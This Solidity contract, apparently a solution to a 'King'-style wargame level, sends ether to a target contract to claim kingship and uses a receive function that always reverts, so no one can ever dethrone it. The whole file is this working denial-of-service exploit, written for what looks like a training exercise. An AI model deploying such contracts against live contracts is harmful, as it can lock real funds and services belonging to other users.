// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.0;

contract Level9 {

    function contractBecomesKing(address king) external payable {
        (bool sent,) = king.call{value: msg.value}("");
        require(sent, "send failed");
    }

    receive() external payable {
        revert();
    }
}